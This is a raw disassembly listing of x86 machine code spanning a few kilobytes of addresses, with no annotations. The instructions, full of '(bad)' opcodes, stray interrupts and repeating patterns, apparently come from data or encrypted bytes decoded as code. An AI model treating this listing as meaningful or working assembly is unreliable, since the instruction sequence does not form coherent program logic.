  427318:	ror    ch,1
  42731a:	(bad)  
  42731b:	cmc    
  42731c:	int    0x89
  42731e:	int    0x96
  427320:	cmc    
  427321:	int    0x22
  427323:	cmp    ecx,DWORD PTR [edi]
  427325:	shr    ebx,cl
  427327:	xchg   edx,eax
  427328:	cmp    ebx,ecx
  42732a:	shr    edx,cl
  42732c:	sub    BYTE PTR [ebx+0x13],dl
  42732f:	retf   0x4d8c
  427332:	rol    BYTE PTR [edx-0x2d],1
  427335:	int    0x8d
  427337:	adc    ebp,ecx
  427339:	mov    ebp,ecx
  42733b:	xchg   esi,eax
  42733c:	adc    ebp,ecx
  42733e:	and    bh,BYTE PTR [ebx]
  427340:	psrlq  mm5,mm3
  427343:	xchg   edx,eax
  427344:	cmp    ebx,ecx
  427346:	shr    edx,cl
  427348:	sub    BYTE PTR [ebx+0x13],dl
  42734b:	retf   0x4d8c
  42734e:	ror    BYTE PTR [edx-0x2d],1
  427351:	int    0x8d
  427353:	in     eax,dx
  427354:	int    0x89
  427356:	int    0x96
  427358:	in     eax,dx
  427359:	int    0x22
  42735b:	cmp    ecx,DWORD PTR [edi]
  42735d:	cmp    ebx,ecx
  42735f:	shr    ebx,cl
  427361:	xchg   edx,eax
  427362:	shr    edx,cl
  427364:	sub    BYTE PTR [ebx+0x13],dl
  427367:	retf   0x4d8c
  42736a:	push   ebp
  42736b:	pusha  
  42736c:	jge    0x427344
  42736e:	xor    bh,cl
  427370:	jbe    0x427342
  427372:	jo     0x427331
  427374:	outs   dx,DWORD PTR ds:[esi]
  427375:	lods   eax,DWORD PTR ds:[esi]
  427376:	add    BYTE PTR [eax],al
  427378:	int    0x8d
  42737a:	pop    ebp
  42737b:	inc    ebx
  42737c:	rcl    esp,cl
  42737e:	push   ss
  42737f:	int    0x76
  427381:	std    
  427382:	int    0x8d
  427384:	std    
  427385:	cmp    esi,eax
  427387:	cmp    edi,DWORD PTR [ecx-0x2d]
  42738a:	repnz sub bl,dl
  42738d:	mov    ebp,0xad35392
  427392:	jbe    0x427341
  427394:	int    0x76
  427396:	stc    
  427397:	int    0xa6
  427399:	stc    
  42739a:	int    0x76
  42739c:	stc    
  42739d:	int    0x8d
  42739f:	stc    
  4273a0:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4273a6:	xchg   edx,eax
  4273a7:	shr    DWORD PTR [ebp-0x7862acd8],cl
  4273ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273ae:	gs int 0x76
  4273b1:	xchg   ebp,eax
  4273b2:	cmp    ecx,DWORD PTR [edi]
  4273b4:	add    al,0xf2
  4273b6:	std    
  4273b7:	add    al,0xad
  4273b9:	std    
  4273ba:	shr    esp,cl
  4273bc:	sub    BYTE PTR [edi+0x12db537d],al
  4273c2:	hlt    
  4273c3:	dec    ecx
  4273c4:	and    DWORD PTR [esi-0x28932cb],eax
  4273ca:	int    0x8d
  4273cc:	std    
  4273cd:	cmp    esi,eax
  4273cf:	cmp    edi,DWORD PTR [ecx-0x2d]
  4273d2:	repnz sub bl,dl
  4273d5:	mov    ebp,0xcdd35392
  4273da:	lea    ebp,[ebp+0x52f7d43]
  4273e0:	push   ds
  4273e1:	std    
  4273e2:	add    BYTE PTR [eax],al
  4273e4:	int    0x76
  4273e6:	std    
  4273e7:	int    0x8d
  4273e9:	std    
  4273ea:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273ed:	lock shl edx,cl
  4273f0:	sub    bl,dl
  4273f2:	mov    ebp,0xcdd35392
  4273f7:	lea    ebp,[ebp+0x1ad67d43]
  4273fd:	int    0x76
  4273ff:	stc    
  427400:	int    0x8d
  427402:	stc    
  427403:	cmp    edi,DWORD PTR [ecx+0x3b]
  427406:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42740d:	push   ebx
  42740e:	shr    ebx,cl
  427410:	jle    0x427393
  427412:	add    BYTE PTR [eax+0x5b6324c0],0x0
  427419:	(bad)  
  42741a:	popf   
  42741b:	iret   
  42741c:	jbe    0x427433
  42741e:	jo     0x4273dd
  427420:	jge    0x4273fd
  427422:	add    BYTE PTR [eax],al
  427424:	int    0x76
  427426:	std    
  427427:	int    0x8d
  427429:	std    
  42742a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42742d:	lock shl edx,cl
  427430:	sub    bl,dl
  427432:	mov    ebp,0xcdd35392
  427437:	lea    esp,[ebp+0x5bd4d343]
  42743d:	int    0x76
  42743f:	stc    
  427440:	int    0x8d
  427442:	stc    
  427443:	cmp    edi,DWORD PTR [ecx+0x3b]
  427446:	lock shl edx,cl
  427449:	sub    bl,dl
  42744b:	mov    ebp,0xcdd35392
  427450:	lea    esp,[ebp+0x26d4d343]
  427456:	int    0x76
  427458:	stc    
  427459:	int    0x8d
  42745b:	stc    
  42745c:	cmp    edi,DWORD PTR [ecx+0x3b]
  42745f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427466:	push   ebx
  427467:	shl    DWORD PTR [eax+0x5b],cl
  42746a:	iret   
  42746b:	jbe    0x427482
  42746d:	jo     0x42742c
  42746f:	das    
  427470:	cli    
  427471:	add    BYTE PTR [eax],al
  427473:	int    0x76
  427475:	std    
  427476:	int    0x8d
  427478:	std    
  427479:	cmp    edi,DWORD PTR [ecx+0x3b]
  42747c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427483:	push   ebx
  427484:	shl    DWORD PTR [eax+0x5b],cl
  427487:	iret   
  427488:	jbe    0x42749f
  42748a:	jo     0x427449
  42748c:	sti    
  42748d:	stc    
  42748e:	add    BYTE PTR [eax],al
  427490:	int    0x76
  427492:	popf   
  427493:	xchg   ebp,eax
  427495:	or     dh,BYTE PTR [esi+0x14]
  427498:	add    dh,dl
  42749a:	cmp    eax,0xcd14d600
  42749f:	jbe    0x4274d6
  4274a1:	xchg   DWORD PTR [esi-0x78],esi
  4274a4:	jo     0x427463
  4274a6:	push   edx
  4274a7:	fild   DWORD PTR [eax]
  4274a9:	add    ch,cl
  4274ab:	jbe    0x4274aa
  4274ad:	int    0x8d
  4274af:	std    
  4274b0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274b3:	lock shl edx,cl
  4274b6:	sub    bl,dl
  4274b8:	mov    ebp,0xcdd35392
  4274bd:	lea    esp,[ebp-0x592b2cbd]
  4274c3:	int    0x76
  4274c5:	stc    
  4274c6:	int    0x8d
  4274c8:	stc    
  4274c9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274cc:	lock shl edx,cl
  4274cf:	sub    bl,dl
  4274d1:	mov    ebp,0xcdd35392
  4274d6:	lea    esp,[ebp+0x32d4d343]
  4274dc:	int    0x76
  4274de:	stc    
  4274df:	int    0x8d
  4274e1:	stc    
  4274e2:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274e5:	mov    ebp,0xd3f03b92
  4274ea:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274ee:	jo     0x4274f0
  4274f0:	(bad)  
  4274f1:	cmp    eax,0x873576cd
  4274f6:	jbe    0x427480
  4274f8:	jo     0x4274b7
  4274fa:	add    eax,0xcd0000f9
  4274ff:	jbe    0x4274fe
  427501:	int    0x8d
  427503:	std    
  427504:	cmp    edi,DWORD PTR [ecx-0x2d]
  427507:	mov    ebp,0xd3f03b92
  42750c:	repnz sub BYTE PTR [ebx-0x2d],dl
  427510:	jo     0x427512
  427512:	(bad)  
  427513:	cmp    eax,0x873576cd
  427518:	jbe    0x4274a2
  42751a:	jo     0x4274d9
  42751c:	jb     0x427517
  42751e:	add    BYTE PTR [eax],al
  427520:	int    0x8d
  427522:	inc    ebp
  427523:	int    0x76
  427525:	inc    ebp
  427526:	cmp    ecx,ecx
  427528:	cmp    ecx,DWORD PTR [edi]
  42752a:	shr    ebx,cl
  42752c:	xchg   edx,eax
  42752d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  427533:	lea    ebp,ds:0x803fd33b
  427539:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427543:	jo     0x427545
  427545:	(bad)  
  427546:	cmp    eax,0x87358dcd
  42754b:	lea    ecx,[eax+0xa95abd]
  427551:	add    ch,cl
  427553:	jbe    0x427585
  427555:	int    0x8d
  427557:	cmp    eax,0x76cd8881
  42755c:	cmp    eax,0xabd7687
  427561:	jbe    0x427520
  427563:	int    0x76
  427565:	stc    
  427566:	int    0x8d
  427568:	stc    
  427569:	cmp    esi,eax
  42756b:	shl    edx,cl
  42756d:	sub    BYTE PTR [ebx],bh
  42756f:	jns    0x427544
  427571:	mov    ebp,0xcdd35392
  427576:	lea    edi,[ebp-0x322c2ed1]
  42757c:	(bad)  
  42757d:	std    
  42757e:	int    0x96
  427580:	std    
  427581:	cmp    ecx,DWORD PTR [edi]
  427583:	cmp    ebx,ecx
  427585:	shr    ebx,cl
  427587:	xchg   edx,eax
  427588:	shr    edx,cl
  42758a:	sub    BYTE PTR [ebx+0x13],dl
  42758d:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  427593:	or     edi,DWORD PTR [ecx]
  427595:	cli    
  427596:	add    BYTE PTR [eax],al
  427598:	int    0x76
  42759a:	mov    BYTE PTR [edx-0x2d349c58],ch
  4275a0:	xor    BYTE PTR [eax+0x4edcd96],al
  4275a6:	in     eax,dx
  4275a7:	adc    al,0x5b
  4275a9:	cwde   
  4275aa:	call   0xcd34:0x76cd6d3b
  4275b1:	add    DWORD PTR ds:0xcd808081,ebp
  4275b7:	xchg   esi,eax
  4275b8:	mov    ch,cl
  4275ba:	or     ch,0xd6
  4275bd:	dec    esp
  4275be:	int    0xe6
  4275c0:	mov    ch,cl
  4275c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275c3:	dec    esp
  4275c4:	or     dh,BYTE PTR [esi-0x3]
  4275c7:	pop    edi
  4275c8:	jnp    0x427601
  4275ca:	ficom  WORD PTR [ebx]
  4275cc:	cmp    esp,ebx
  4275ce:	pop    ebp
  4275cf:	mov    ebp,0x3b25230a
  4275d4:	adc    DWORD PTR [edi],ebp
  4275d6:	inc    ebp
  4275d7:	sti    
  4275d8:	xchg   edx,eax
  4275d9:	shr    ecx,cl
  4275db:	sub    BYTE PTR [edx],dl
  4275dd:	clc    
  4275de:	add    BYTE PTR [eax-0x102c9380],0x92
  4275e5:	cmp    ebx,ebp
  4275e7:	push   ebx
  4275e8:	clc    
  4275e9:	int    0xe6
  4275eb:	sbb    al,0x53
  4275ed:	aad    0x43
  4275ef:	(bad)  
  4275f1:	sbb    eax,DWORD PTR [ebx-0xc]
  4275f4:	(bad)  
  4275f5:	das    
  4275f6:	adc    cl,BYTE PTR [ebp+0x59]
  4275f9:	je     0x4275a5
  4275fb:	push   edi
  4275fc:	ja     0x4275c3
  4275fe:	xchg   edi,eax
  4275ff:	shr    ebx,0xd9
  427602:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  42760c:	xchg   esi,eax
  42760d:	mov    ch,cl
  42760f:	(bad)  
  427610:	dec    esp
  427611:	int    0x96
  427613:	mov    ch,cl
  427615:	(bad)  
  427616:	dec    esp
  427617:	int    0xe6
  427619:	mov    ch,cl
  42761b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42761c:	dec    esp
  42761d:	cmp    edx,DWORD PTR [ecx]
  42761f:	cmp    esp,ebx
  427621:	das    
  427622:	inc    ebp
  427623:	sti    
  427624:	xchg   edx,eax
  427625:	shr    ecx,cl
  427627:	sub    BYTE PTR [edx],dl
  427629:	clc    
  42762a:	add    BYTE PTR [eax-0x22c49380],0x53
  427631:	aad    0xd3
  427633:	out    dx,eax
  427634:	xchg   edx,eax
  427635:	push   ebx
  427636:	clc    
  427637:	int    0xe6
  427639:	xor    ch,cl
  42763b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42763c:	adc    al,0x3b
  42763e:	popf   
  42763f:	int    0x76
  427641:	xor    BYTE PTR [ebx],bh
  427643:	cli    
  427644:	int    0x8d
  427646:	adc    al,0x2f
  427648:	inc    ebp
  427649:	loope  0x4275dd
  42764b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  427651:	cli    
  427652:	push   esi
  427653:	add    BYTE PTR [eax-0x132c9380],0x92
  42765a:	push   ebx
  42765b:	popf   
  42765c:	int    0x76
  42765e:	mov    BYTE PTR [edi-0x320be427],al
  427664:	bswap  ebp
  427666:	(bad)  
  427667:	dec    esp
  427668:	int    0xe6
  42766a:	xor    ch,cl
  42766c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42766d:	adc    al,0x4
  42766f:	lods   eax,DWORD PTR ds:[esi]
  427670:	std    
  427671:	add    al,0xe9
  427673:	std    
  427674:	shr    ebx,cl
  427676:	sub    BYTE PTR [ebx],bh
  427678:	ficom  DWORD PTR [esi-0x2c]
  42767b:	aaa    
  42767c:	ficom  WORD PTR [ebx]
  42767e:	adc    dh,bh
  427680:	mov    ebp,0x1225230a
  427685:	clc    
  427686:	aam    0x37
  427688:	ficom  WORD PTR [ebx]
  42768a:	adc    dh,ah
  42768c:	mov    ebp,0x8725230a
  427691:	leave  
  427692:	sbb    esi,esp
  427694:	push   ebx
  427695:	jge    0x4276ea
  427697:	cdq    
  427698:	pop    ebp
  427699:	mov    ebp,0x1225230a
  42769e:	add    dl,dh
  4276a0:	aaa    
  4276a1:	ficom  WORD PTR [ebx]
  4276a3:	cmp    esi,ecx
  4276a5:	adc    bh,dl
  4276a7:	out    0x37,al
  4276a9:	ficom  WORD PTR [ebx]
  4276ab:	(bad)  
  4276ac:	sbb    eax,DWORD PTR [ebx-0xf]
  4276af:	(bad)  
  4276b0:	das    
  4276b1:	adc    dl,BYTE PTR [esi-0x1]
  4276b4:	das    
  4276b5:	stos   DWORD PTR es:[edi],eax
  4276b6:	push   es
  4276b7:	in     eax,0x9b
  4276b9:	xchg   edi,eax
  4276ba:	imul   bl
  4276bc:	and    al,0x81
  4276be:	add    BYTE PTR [eax-0x32776933],0xd6
  4276c5:	dec    esp
  4276c6:	int    0xa6
  4276c8:	mov    ch,cl
  4276ca:	out    0x4c,al
  4276cc:	cmp    edx,DWORD PTR [ecx]
  4276ce:	pop    edi
  4276cf:	jnp    0x427708
  4276d1:	ficom  WORD PTR [ebx]
  4276d3:	cmp    esp,ebx
  4276d5:	das    
  4276d6:	inc    ebp
  4276d7:	sti    
  4276d8:	xchg   edx,eax
  4276d9:	shr    edi,cl
  4276db:	xchg   edx,eax
  4276dc:	cmp    eax,DWORD PTR [eax]
  4276de:	shl    ebp,cl
  4276e0:	sub    BYTE PTR [edx],cl
  4276e2:	(bad)  
  4276e3:	cmc    
  4276e4:	push   ebx
  4276e5:	fxch   st(5)
  4276e7:	out    0xf5,al
  4276e9:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  4276f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276f4:	and    al,0xcd
  4276f6:	and    ecx,DWORD PTR [edx]
  4276f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276f9:	adc    DWORD PTR [ebx-0x1e],eax
  4276fc:	(bad)  
  4276fd:	xchg   BYTE PTR [ebx],bh
  4276ff:	fiadd  DWORD PTR [ebx-0x27]
  427702:	aam    0x20
  427704:	add    dh,dl
  427706:	xor    al,0xcd
  427708:	(bad)  
  427709:	and    al,0x0
  42770b:	(bad)  
  42770c:	sub    al,0x0
  42770e:	(bad)  
  42770f:	std    
  427710:	add    BYTE PTR [eax-0x43],bl
  427713:	sub    edi,eax
  427715:	add    BYTE PTR [eax],al
  427717:	or     al,BYTE PTR [esi-0x7f7f9615]
  42771d:	or     ch,0x96
  427720:	mov    ch,cl
  427722:	out    0x4c,al
  427724:	cmp    edi,ecx
  427726:	cmp    esp,ebx
  427728:	das    
  427729:	inc    ebp
  42772a:	add    edx,DWORD PTR [edx+0xa9210d3]
  427730:	out    0xf5,al
  427732:	int    0xe6
  427734:	mov    ch,cl
  427736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427737:	dec    esp
  427738:	shr    ecx,cl
  42773a:	sub    BYTE PTR [ebx],bh
  42773c:	dec    ebp
  42773e:	(bad)  
  42773f:	cmc    
  427740:	cmp    ebx,ebp
  427742:	push   ebx
  427743:	clc    
  427744:	int    0xe6
  427746:	xor    BYTE PTR [ebx],bh
  427748:	cli    
  427749:	push   ebx
  42774a:	aad    0xcd
  42774c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42774d:	adc    al,0x3b
  42774f:	popf   
  427750:	int    0xc9
  427752:	int    0xe6
  427754:	xor    ch,cl
  427756:	or     al,0xcd
  427758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427759:	adc    al,0x2f
  42775b:	inc    ebp
  42775c:	jge    0x4276f0
  42775e:	shr    ecx,cl
  427760:	sub    BYTE PTR [ebx],bh
  427762:	fst    st(3)
  427764:	jmp    0x4276f8
  427766:	adc    bh,al
  427768:	add    BYTE PTR [eax-0x3aac9380],0x53
  42776f:	lock inc ebx
  427771:	icebp  
  427772:	(bad)  
  427773:	sbb    BYTE PTR [ebx+0x2],al
  427776:	(bad)  
  427777:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  42777d:	mov    esi,0xdd8bf56d
  427782:	(bad)  
  427783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427784:	cmp    edi,esp
  427786:	sbb    eax,0xcd62ec76
  42778b:	jbe    0x427715
  42778d:	int    0x8d
  42778f:	dec    esp
  427790:	int    0x96
  427792:	mov    ch,cl
  427794:	(bad)  
  427795:	dec    esp
  427796:	adc    al,BYTE PTR [edx]
  427798:	mov    ebp,0x5625230a
  42779d:	jnp    0x4277d6
  42779f:	ficom  WORD PTR [ebx]
  4277a1:	das    
  4277a2:	inc    ebp
  4277a3:	jge    0x427737
  4277a5:	int    0xfb
  4277a7:	cmp    eax,DWORD PTR [eax]
  4277a9:	cmp    ebx,edx
  4277ab:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  4277b1:	jmp    0x427745
  4277b3:	adc    dh,bh
  4277b5:	add    BYTE PTR [eax-0x36ac9380],0x53
  4277bc:	divps  xmm6,XMMWORD PTR [esi-0x3]
  4277c0:	(bad)  
  4277c1:	test   BYTE PTR [ebx-0x1d],al
  4277c4:	aam    0x4c
  4277c6:	adc    al,BYTE PTR [esi-0x3e]
  4277c9:	gs sub al,0x1
  4277cc:	jo     0x427808
  4277ce:	mov    edx,0x124aece0
  4277d3:	ss inc edx
  4277d5:	das    
  4277d6:	sbb    edx,esi
  4277d8:	mov    ebx,0xaa029f75
  4277dd:	test   al,0x63
  4277df:	retf   
  4277e0:	shr    BYTE PTR [eax+eax*4],cl
  4277e3:	xchg   esi,eax
  4277e4:	int    0xed
  4277e6:	add    al,0xed
  4277e8:	dec    esp
  4277e9:	int    0x76
  4277eb:	mov    ch,cl
  4277ed:	lea    ecx,[edi+ebp*1+0x45]
  4277f1:	jge    0x427785
  4277f3:	shr    ebx,cl
  4277f5:	xchg   edx,eax
  4277f6:	int    0x8d
  4277f8:	mov    ch,cl
  4277fa:	xchg   esi,eax
  4277fb:	dec    esp
  4277fc:	cwde   
  4277fd:	shl    edx,cl
  4277ff:	sub    ch,cl
  427801:	lea    ebx,[ecx+ebp*2]
  427804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427805:	mov    esi,0x793b4229
  42780a:	cmp    ebx,edx
  42780c:	push   ebx
  42780d:	ror    BYTE PTR [edx],cl
  42780f:	or     ebp,0x1cd2476
  427815:	xor    eax,0xcd808081
  42781a:	mov    ch,cl
  42781c:	jbe    0x427842
  42781e:	int    0x1
  427820:	xor    eax,0xcd808081
  427825:	add    BYTE PTR [edi-0x72329b92],0x24
  42782c:	int    0xa
  42782e:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  427834:	adc    al,0xc0
  427836:	test   BYTE PTR [eax+eax*4+0x808050],bh
  42783d:	nop
  42783e:	jo     0x4278a2
  427840:	add    bl,ah
  427842:	or     cl,BYTE PTR [ebx-0x32778933]
  427848:	lea    ecx,[edi+ebp*1+0x45]
  42784c:	jge    0x4277e0
  42784e:	shr    ebx,cl
  427850:	xchg   edx,eax
  427851:	int    0x8d
  427853:	mov    ch,cl
  427855:	xchg   esi,eax
  427856:	dec    esp
  427857:	add    dh,dl
  427859:	and    al,0x3b
  42785b:	jns    0x427898
  42785d:	ficom  DWORD PTR [ebx-0x2e]
  427860:	or     dh,BYTE PTR [esi-0x3]
  427863:	iret   
  427864:	jbe    0x427863
  427866:	jo     0x427802
  427868:	add    dh,dl
  42786a:	sbb    al,0xd3
  42786c:	repnz sub BYTE PTR [eax],al
  42786f:	(bad)  
  427870:	adc    al,0x0
  427872:	(bad)  
  427873:	xor    BYTE PTR [eax],al
  427875:	(bad)  
  427876:	dec    esp
  427877:	add    dh,dl
  427879:	mov    BYTE PTR [ebp+0xfe2b],bh
  42787f:	int    0x76
  427881:	mov    ch,cl
  427883:	lea    ecx,[edi+ebp*1+0x45]
  427887:	jge    0x42781b
  427889:	shr    ebx,cl
  42788b:	xchg   edx,eax
  42788c:	int    0x8d
  42788e:	mov    ch,cl
  427890:	xchg   esi,eax
  427891:	dec    esp
  427892:	cmp    edi,DWORD PTR [ecx+0x3b]
  427895:	fcmovbe st,st(3)
  427897:	repnz sub ch,cl
  42789a:	das    
  42789b:	push   ebx
  42789c:	rol    BYTE PTR [ebx+0x7d],cl
  42789f:	aam    0x36
  4278a1:	int    0x76
  4278a3:	xor    ch,cl
  4278a5:	lea    edx,[edi+ebp*1]
  4278a8:	inc    ebp
  4278a9:	jge    0x42783d
  4278ab:	shr    ebx,cl
  4278ad:	xchg   edx,eax
  4278ae:	int    0x8d
  4278b0:	xor    ch,cl
  4278b2:	xchg   esi,eax
  4278b3:	adc    al,0x3b
  4278b5:	jns    0x4278f2
  4278b7:	fcmovbe st,st(3)
  4278b9:	repnz sub ch,cl
  4278bc:	lea    ebx,[ebx+edx*2]
  4278bf:	shr    BYTE PTR [edi],cl
  4278c1:	shl    DWORD PTR [esi-0x3],1
  4278c4:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  4278ca:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  4278d1:	call   0xcd3c:0xd6cd6d3b
  4278d8:	xchg   esi,eax
  4278d9:	inc    esp
  4278da:	int    0xe6
  4278dc:	and    al,0x5d
  4278de:	mov    ebp,0x5f25230a
  4278e3:	jnp    0x42791c
  4278e5:	ficom  WORD PTR [ebx]
  4278e7:	inc    ebx
  4278e8:	icebp  
  4278e9:	das    
  4278ea:	or     BYTE PTR [edi],al
  4278ec:	add    BYTE PTR [eax-0x4613080],0x82
  4278f3:	test   BYTE PTR [ebx-0xc],al
  4278f6:	jnp    0x4278de
  4278f8:	inc    ebx
  4278f9:	hlt    
  4278fa:	(bad)  
  4278fb:	mov    BYTE PTR [ebx-0xf],al
  4278fe:	das    
  4278ff:	add    eax,0x80809216
  427904:	adc    bh,bh
  427906:	jno    0x42793f
  427908:	ficom  WORD PTR [ebx]
  42790a:	(bad)  
  42790b:	mov    BYTE PTR [ebx-0xf],al
  42790e:	das    
  42790f:	add    eax,0x80809285
  427914:	adc    bh,bh
  427916:	xchg   esi,eax
  427917:	aaa    
  427918:	ficom  WORD PTR [ebx]
  42791a:	(bad)  
  42791b:	mov    BYTE PTR [ebx-0xf],al
  42791e:	das    
  42791f:	add    eax,0x808080f8
  427924:	adc    bh,bh
  427926:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427927:	aaa    
  427928:	ficom  WORD PTR [ebx]
  42792a:	(bad)  
  42792b:	test   BYTE PTR [ebx-0xf],al
  42792e:	aam    0x3e
  427930:	adc    bh,bh
  427932:	scas   al,BYTE PTR es:[edi]
  427933:	aaa    
  427934:	ficom  WORD PTR [ebx]
  427936:	(bad)  
  427937:	mov    BYTE PTR [ebx-0xf],al
  42793a:	das    
  42793b:	add    eax,0x808081db
  427940:	adc    bh,bh
  427942:	mov    dh,0x37
  427944:	ficom  WORD PTR [ebx]
  427946:	das    
  427947:	push   es
  427948:	into   
  427949:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  427953:	sub    bl,0x12
  427956:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  427960:	(bad)  
  427961:	adc    al,0x0
  427963:	(bad)  
  427964:	xor    BYTE PTR [eax],al
  427966:	(bad)  
  427967:	dec    esp
  427968:	add    dh,dl
  42796a:	mov    BYTE PTR [ebp+0xff77],bh
  427970:	jmp    0x427928
  427972:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  42797c:	mov    BYTE PTR [ebx-0xf],al
  42797f:	das    
  427980:	add    eax,0x80808019
  427985:	adc    bh,bh
  427987:	xchg   ecx,eax
  427988:	aaa    
  427989:	ficom  WORD PTR [ebx]
  42798b:	(bad)  
  42798c:	mov    BYTE PTR [ebx-0xf],al
  42798f:	das    
  427990:	add    eax,0x8080818e
  427995:	adc    bh,bh
  427997:	(bad)  
  427998:	aaa    
  427999:	ficom  WORD PTR [ebx]
  42799b:	(bad)  
  42799c:	test   BYTE PTR [ebx-0xf],al
  42799f:	aam    0x1c
  4279a1:	adc    bh,bh
  4279a3:	fidiv  WORD PTR [edi]
  4279a5:	ficom  WORD PTR [ebx]
  4279a7:	(bad)  
  4279a8:	mov    BYTE PTR [ebx-0xf],al
  4279ab:	das    
  4279ac:	add    eax,0x80808142
  4279b1:	adc    bh,bh
  4279b3:	out    0x37,al
  4279b5:	ficom  WORD PTR [ebx]
  4279b7:	in     al,dx
  4279b8:	iret   
  4279b9:	int    0x96
  4279bb:	mov    ch,cl
  4279bd:	(bad)  
  4279be:	dec    esp
  4279bf:	int    0xe6
  4279c1:	mov    ch,cl
  4279c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279c4:	dec    esp
  4279c5:	cmp    edx,DWORD PTR [ecx]
  4279c7:	cmp    esp,ebx
  4279c9:	das    
  4279ca:	inc    ebp
  4279cb:	sti    
  4279cc:	xchg   edx,eax
  4279cd:	shr    ecx,cl
  4279cf:	sub    BYTE PTR [edx],dl
  4279d1:	clc    
  4279d2:	add    BYTE PTR [eax-0x102c9380],0x92
  4279d9:	cmp    ebx,ebp
  4279db:	push   ebx
  4279dc:	clc    
  4279dd:	int    0xe6
  4279df:	mov    BYTE PTR [ebx-0x2b],dl
  4279e2:	int    0xa6
  4279e4:	dec    esp
  4279e5:	xchg   ecx,ebx
  4279e7:	sbb    esi,esp
  4279e9:	or     dl,BYTE PTR [esi+0x4cd60a88]
  4279ef:	int    0x96
  4279f1:	mov    ch,cl
  4279f3:	(bad)  
  4279f4:	dec    esp
  4279f5:	int    0xe6
  4279f7:	mov    ch,cl
  4279f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279fa:	dec    esp
  4279fb:	cmp    edx,DWORD PTR [ecx]
  4279fd:	cmp    esp,ebx
  4279ff:	das    
  427a00:	inc    ebp
  427a01:	sti    
  427a02:	xchg   edx,eax
  427a03:	shr    ecx,cl
  427a05:	sub    BYTE PTR [ebx],bh
  427a07:	fst    st(3)
  427a09:	out    dx,eax
  427a0a:	xchg   edx,eax
  427a0b:	adc    bh,al
  427a0d:	add    BYTE PTR [eax-0x2aac9380],0x53
  427a14:	clc    
  427a15:	ds xchg esi,eax
  427a17:	xor    BYTE PTR [esi],bl
  427a19:	(bad)  
  427a1a:	adc    al,0xcd
  427a1c:	xchg   esi,eax
  427a1d:	cmp    al,0xcd
  427a1f:	(bad)  
  427a20:	inc    esp
  427a21:	int    0x96
  427a23:	xor    ch,cl
  427a25:	(bad)  
  427a26:	adc    al,0xcd
  427a28:	xchg   esi,eax
  427a29:	xor    ch,cl
  427a2b:	(bad)  
  427a2c:	adc    al,0xcd
  427a2e:	out    0x30,al
  427a30:	int    0xa6
  427a32:	adc    al,0x3b
  427a34:	adc    DWORD PTR [ebx],edi
  427a36:	jecxz  0x427a67
  427a38:	inc    ebp
  427a39:	sti    
  427a3a:	xchg   edx,eax
  427a3b:	shr    ecx,cl
  427a3d:	sub    BYTE PTR [ebx],bh
  427a3f:	fst    QWORD PTR [edx]
  427a41:	clc    
  427a42:	add    BYTE PTR [eax-0x102c9380],0x92
  427a49:	push   ebx
  427a4a:	clc    
  427a4b:	int    0xe6
  427a4d:	cmp    al,0x53
  427a4f:	aad    0xcd
  427a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a52:	inc    esp
  427a53:	cmp    edi,edx
  427a55:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427a5b:	lea    eax,[edi+ebp*1+0x45]
  427a5f:	loope  0x4279f3
  427a61:	cmp    ecx,ebx
  427a63:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427a69:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427a6e:	lea    esi,[eax]
  427a70:	shr    esp,cl
  427a72:	xchg   edx,eax
  427a73:	push   ebx
  427a74:	popf   
  427a75:	xchg   ecx,ebx
  427a77:	int    0x96
  427a79:	adc    al,0x1b
  427a7b:	hlt    
  427a7c:	add    al,0xf2
  427a7e:	std    
  427a7f:	shr    edi,cl
  427a81:	sub    BYTE PTR [ebx],bh
  427a83:	ins    DWORD PTR es:[edi],dx
  427a84:	adc    al,BYTE PTR [edx]
  427a86:	aam    0x37
  427a88:	ficom  WORD PTR [ebx]
  427a8a:	adc    bh,bl
  427a8c:	mov    ebp,0xcd25230a
  427a91:	out    0x3c,al
  427a93:	int    0xa6
  427a95:	inc    esp
  427a96:	add    al,0xe9
  427a98:	std    
  427a99:	adc    bh,al
  427a9b:	aam    0x37
  427a9d:	ficom  WORD PTR [ebx]
  427a9f:	adc    dh,ah
